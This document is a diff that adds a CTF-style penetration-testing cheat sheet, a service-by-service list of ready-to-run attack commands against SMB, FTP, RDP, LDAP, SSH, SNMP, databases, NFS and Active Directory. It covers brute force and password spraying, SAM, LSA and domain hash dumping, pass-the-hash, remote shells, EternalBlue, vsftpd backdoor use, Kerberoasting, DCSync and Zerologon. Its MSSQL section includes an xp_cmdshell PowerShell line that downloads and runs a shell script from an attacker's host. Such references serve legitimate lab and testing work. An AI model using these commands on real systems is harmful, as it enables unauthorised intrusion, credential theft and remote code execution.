@@ -1,0 +1,268 @@
+NMAP - ADVANCED SCRIPTS
+Initial Recon
+bash# Full port scan first (fast)
+nmap -p- --min-rate=10000 -T4 target -oN allports.txt
+
+# Targeted version + script scan on open ports
+nmap -sC -sV -p 21,22,80,139,443,445,3389 target -oN targeted.txt
+
+# UDP scan (often missed in CTF)
+nmap -sU --top-ports 200 --min-rate=5000 target
+
+# OS detection + aggressive
+nmap -A -T4 target
+
+# Vuln scan all open ports
+nmap --script vuln -p 21,22,80,445 target
+
+SMB
+Nmap Scripts
+bashnmap --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode -p 139,445 target
+nmap --script smb-vuln-* -p 445 target          # all SMB vulns
+nmap --script smb-vuln-ms17-010 -p 445 target   # EternalBlue
+nmap --script smb-vuln-ms08-067 -p 445 target   # Conficker era
+nmap --script smb2-security-mode -p 445 target
+nmap --script smb-enum-domains -p 445 target
+Tools
+bash# enum4linux-ng (best SMB enum)
+enum4linux-ng -A target
+enum4linux-ng -A -C target   # with credentials
+
+# smbclient
+smbclient -L //target -N              # null session list shares
+smbclient //target/sharename -N       # connect null
+smbclient //target/sharename -U user  # with creds
+smbclient //target/C$ -U 'admin%password'
+
+# smbmap
+smbmap -H target                          # null
+smbmap -H target -u user -p pass
+smbmap -H target -u user -p pass -r       # recursive list
+smbmap -H target -u user -p pass --download 'share\file.txt'
+
+# crackmapexec (CME) - swiss army knife
+crackmapexec smb target
+crackmapexec smb target -u '' -p ''                    # null
+crackmapexec smb target -u user -p pass
+crackmapexec smb target -u users.txt -p pass           # spray
+crackmapexec smb target -u user -p pass --shares
+crackmapexec smb target -u user -p pass --sam          # dump SAM
+crackmapexec smb target -u user -p pass --lsa          # dump LSA
+crackmapexec smb target -u user -p pass -x "whoami"    # exec cmd
+crackmapexec smb target -u user -p pass --spider share # spider share
+crackmapexec smb target -u user -H NTLMhash            # PTH attack
+
+# impacket suite
+impacket-smbclient user:pass@target
+impacket-secretsdump user:pass@target      # dump hashes
+impacket-secretsdump -just-dc target/user:pass@dc_ip  # domain dump
+impacket-psexec user:pass@target           # shell via SMB
+impacket-wmiexec user:pass@target          # WMI shell
+impacket-atexec user:pass@target "whoami"  # AT scheduler exec
+EternalBlue
+bash# Check + exploit
+nmap --script smb-vuln-ms17-010 -p 445 target
+# If vulnerable:
+python3 checker.py target
+python3 eternalblue_exploit7.py target shellcode/sc_x64.bin
+# Or use metasploit: use exploit/windows/smb/ms17_010_eternalblue
+
+FTP
+Nmap Scripts
+bashnmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 target
+nmap --script ftp-brute -p 21 target                    # brute force
+nmap --script ftp-anon -p 21 target                     # anon login check
+Tools
+bash# Check anonymous
+ftp target
+# user: anonymous | pass: anything
+
+# Hydra brute
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target
+hydra -L users.txt -P pass.txt ftp://target -t 4
+
+# wget recursive download
+wget -m ftp://anonymous:@target/
+
+# curl
+curl -v ftp://target/ --user anonymous:
+curl ftp://target/file.txt -o file.txt
+
+# vsftpd 2.3.4 backdoor (port 6200 opens)
+telnet target 21
+USER user:)
+PASS pass
+# Then: nc target 6200
+# Or metasploit: use exploit/unix/ftp/vsftpd_234_backdoor
+
+RDP
+Nmap Scripts
+bashnmap --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-enum-encryption -p 3389 target
+nmap -sV --script rdp* -p 3389 target
+Tools
+bash# Check if NLA required
+nmap -p 3389 --script rdp-enum-encryption target
+
+# Brute force
+hydra -l administrator -P rockyou.txt rdp://target
+crowbar -b rdp -s target/32 -U users.txt -C pass.txt
+
+# BlueKeep check (CVE-2019-0708)
+nmap --script rdp-vuln-ms12-020 -p 3389 target
+# Metasploit: use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+
+# Connect
+xfreerdp /u:user /p:pass /v:target
+xfreerdp /u:user /p:pass /v:target /cert-ignore
+rdesktop target -u user -p pass
+
+# Pass the Hash via RDP (restricted admin mode)
+xfreerdp /u:admin /pth:NTLM_HASH /v:target
+
+# Dump creds from RDP sessions (if shell access)
+mimikatz # ts::logonpasswords
+
+LDAP
+Nmap Scripts
+bashnmap --script ldap-rootdse,ldap-search,ldap-novell-getpass -p 389,636 target
+nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=domain,dc=com",ldap.password=pass,ldap.qfilter=users' target
+Tools
+bash# Anonymous LDAP enum
+ldapsearch -x -H ldap://target -b "dc=domain,dc=com"
+ldapsearch -x -H ldap://target -b "" -s base namingcontexts  # get base DN
+
+# Authenticated
+ldapsearch -x -H ldap://target -D "cn=admin,dc=domain,dc=com" -w pass -b "dc=domain,dc=com"
+
+# Dump everything
+ldapsearch -x -H ldap://target -D "user@domain.com" -w pass -b "dc=domain,dc=com" > ldap_dump.txt
+
+# Specific queries
+ldapsearch -x -H ldap://target -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName  # all users
+ldapsearch -x -H ldap://target -b "dc=domain,dc=com" "(objectClass=group)"               # groups
+ldapsearch -x -H ldap://target -b "dc=domain,dc=com" "(objectClass=computer)"            # computers
+ldapsearch -x -H ldap://target -b "dc=domain,dc=com" "(&(objectClass=user)(adminCount=1))" # admins
+
+# ldapdomaindump (outputs HTML/JSON)
+ldapdomaindump ldap://target -u 'domain\user' -p pass
+
+# Bloodhound collection (AD enumeration)
+bloodhound-python -u user -p pass -d domain.com -c All -ns target_dc_ip
+# Then load JSON into Bloodhound GUI
+
+# windapsearch
+python3 windapsearch.py --dc-ip target -u user@domain.com -p pass --da  # domain admins
+python3 windapsearch.py --dc-ip target -u user@domain.com -p pass -U    # all users
+python3 windapsearch.py --dc-ip target -u user@domain.com -p pass --computers
+
+SSH
+Nmap Scripts
+bashnmap --script ssh-auth-methods,ssh-hostkey,ssh-run,ssh2-enum-algos -p 22 target
+nmap --script ssh-brute -p 22 target
+Tools
+bash# Audit algorithms (find weak ones)
+ssh-audit target
+
+# Brute
+hydra -l root -P rockyou.txt ssh://target
+medusa -h target -u root -P rockyou.txt -M ssh
+crackmapexec ssh target -u users.txt -p pass.txt
+
+# Old key reuse exploit
+# If you find an id_rsa anywhere (web, SMB, FTP)
+chmod 600 id_rsa
+ssh -i id_rsa user@target
+
+# Username enum (older OpenSSH)
+msf > use auxiliary/scanner/ssh/ssh_enumusers
+
+SNMP
+Nmap Scripts
+bashnmap -sU --script snmp-brute,snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services -p 161 target
+Tools
+bash# Community string brute
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target
+hydra -P community_strings.txt -v target snmp
+
+# snmpwalk (dump everything)
+snmpwalk -c public -v1 target
+snmpwalk -c public -v2c target
+snmpwalk -c public -v2c target 1.3.6.1.4.1.77.1.2.25  # Windows users
+snmpwalk -c public -v2c target 1.3.6.1.2.1.25.4.2.1.2 # Running processes
+snmpwalk -c public -v2c target 1.3.6.1.2.1.6.13.1.3   # Open TCP ports
+snmpwalk -c public -v2c target 1.3.6.1.2.1.25.6.3.1.2 # Installed software
+
+# snmp-check (cleaner output)
+snmp-check target -c public
+
+MSSQL
+Nmap Scripts
+bashnmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess -p 1433 target
+nmap --script ms-sql-brute -p 1433 target
+Tools
+bash# impacket
+impacket-mssqlclient user:pass@target
+impacket-mssqlclient user:pass@target -windows-auth
+
+# Inside mssqlclient:
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+SQL> xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://yourip/shell.ps1')"
+
+# crackmapexec
+crackmapexec mssql target -u user -p pass
+crackmapexec mssql target -u user -p pass -x "whoami"
+
+# SQLMap against MSSQL
+sqlmap -d "mssql://user:pass@target:1433/master" --os-shell
+
+MySQL / PostgreSQL
+bash# MySQL
+nmap --script mysql-info,mysql-enum,mysql-empty-password,mysql-brute -p 3306 target
+mysql -h target -u root -p
+mysql -h target -u root --password=''   # blank password
+
+# PostgreSQL
+nmap --script pgsql-brute -p 5432 target
+psql -h target -U postgres
+# Default: postgres:postgres | postgres:(blank)
+
+NFS
+bashnmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 target
+showmount -e target
+mount -t nfs target:/share /mnt/nfs
+# Check for root squashing disabled (mount as root → full access)
+
+FULL AUTOMATED RECON
+bash# AutoRecon (best all-in-one CTF tool)
+autorecon target
+autorecon target --only-scans-dir
+
+# Legion (GUI)
+legion
+
+# Reconnoitre
+python reconnoitre.py -t target -o ./output --services
+
+# Metasploit db_nmap
+db_nmap -sV -sC -p- target
+vulns  # after scan, list vulns found
+
+AD SPECIFIC (if domain environment)
+bash# Kerberoasting
+impacket-GetUserSPNs domain.com/user:pass -dc-ip target -request
+hashcat -m 13100 hashes.txt rockyou.txt
+
+# ASREPRoasting (no preauth required)
+impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip target
+hashcat -m 18200 hashes.txt rockyou.txt
+
+# Pass the Hash
+crackmapexec smb target -u admin -H NTLM_HASH
+impacket-psexec -hashes :NTLM_HASH admin@target
+
+# DCSync (if DA)
+impacket-secretsdump domain/user:pass@dc_ip -just-dc
+
+# Zerologon (CVE-2020-1472)
+python3 zerologon_tester.py DC_NAME target_ip
